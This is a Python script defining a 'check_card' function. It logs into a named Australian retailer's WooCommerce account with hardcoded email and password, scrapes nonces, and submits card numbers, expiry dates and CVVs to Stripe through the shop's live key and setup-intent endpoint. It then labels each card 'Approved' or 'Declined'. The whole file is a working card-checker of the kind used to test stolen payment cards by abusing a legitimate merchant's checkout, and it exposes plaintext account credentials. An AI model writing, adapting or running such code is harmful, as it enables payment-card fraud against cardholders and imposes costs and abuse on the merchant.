import requests
import random
import re
import json
import uuid

def check_card(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return {"cc": ccx, "response": "Invalid card format. Use CC|MM|YYYY|CVV", "status": "Declined", "gateway": "Stripe Auth"}

        n, mm, yy, cvc = parts

        session = requests.Session()
        user_agents = [
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
        ]
        user_agent = random.choice(user_agents)

        # Step 1: Login
        resp = session.get("https://thefloordepot.com.au/my-account/", headers={'user-agent': user_agent})
        match = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', resp.text)
        if not match:
            return {"cc": ccx, "response": "Nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
        nonce = match.group(1)

        login_data = {
            "username": "frabsok@gmail.com",
            "password": "Sh@7380046305",
            "rememberme": "forever",
            "woocommerce-login-nonce": nonce,
            "_wp_http_referer": "/my-account/",
            "login": "Log in",
        }
        session.post("https://thefloordepot.com.au/my-account/", data=login_data, headers={'user-agent': user_agent})

        # Step 2: Get add_card_nonce
        resp = session.get("https://thefloordepot.com.au/my-account/add-payment-method/", headers={'user-agent': user_agent})
        match = re.search(r'"add_card_nonce":"([a-zA-Z0-9]+)"', resp.text)
        if not match:
            return {"cc": ccx, "response": "add_card_nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
        add_card_nonce = match.group(1)

        # Step 3: Create Stripe source
        stripe_data = {
            "referrer": "https://thefloordepot.com.au",
            "type": "card",
            "owner[name]": "+",
            "owner[email]": "frabsok@gmail.com",
            "card[number]": n,
            "card[cvc]": cvc,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "guid": uuid.uuid4().hex,
            "muid": uuid.uuid4().hex,
            "sid": uuid.uuid4().hex,
            "payment_user_agent": "stripe.js/ stripe-js-v3/ split-card-element",
            "time_on_page": str(1000),
            "key": "pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq"
        }
        resp = session.post("https://api.stripe.com/v1/sources", data=stripe_data, headers={'user-agent': user_agent})
        stripe_resp = resp.json()

        if "error" in stripe_resp:
            error_code = stripe_resp["error"].get("code")
            error_message = stripe_resp["error"].get("message", "Unknown Stripe error")
            if error_code == "card_declined":
                return {"cc": ccx, "response": "Card was declined", "status": "Declined", "gateway": "Stripe Auth"}
            return {"cc": ccx, "response": error_message, "status": "Declined", "gateway": "Stripe Auth"}

        source_id = stripe_resp.get("id")
        if not source_id:
            return {"cc": ccx, "response": "Payment source creation failed", "status": "Declined", "gateway": "Stripe Auth"}

        # Step 4: Attach source to WooCommerce setup intent
        setup_resp = session.post(
            "https://thefloordepot.com.au/",
            params={"wc-ajax": "wc_stripe_create_setup_intent"},
            data={"stripe_source_id": source_id, "nonce": add_card_nonce},
            headers={'user-agent': user_agent, 'X-Requested-With': 'XMLHttpRequest'}
        )

        try:
            setup_data = setup_resp.json()
        except json.JSONDecodeError:
            return {"cc": ccx, "response": "Invalid JSON response from server", "status": "Declined", "gateway": "Stripe Auth"}

        status = setup_data.get("data", {}).get("status")
        if status == "requires_action":
            return {"cc": ccx, "response": "OTP_REQUIRED", "status": "Approved", "gateway": "Stripe Auth"}
        elif status == "succeeded":
            return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth"}
        elif "error" in setup_data.get("data", {}):
            error_msg = setup_data["data"]["error"].get("message", "Unknown error")
            return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth"}

        return {"cc": ccx, "response": str(setup_data), "status": "Declined", "gateway": "Stripe Auth"}

    except Exception as e:
        return {"cc": ccx, "response": f"Setup Intent Failed: {str(e)}", "status": "Declined", "gateway": "Stripe Auth"}
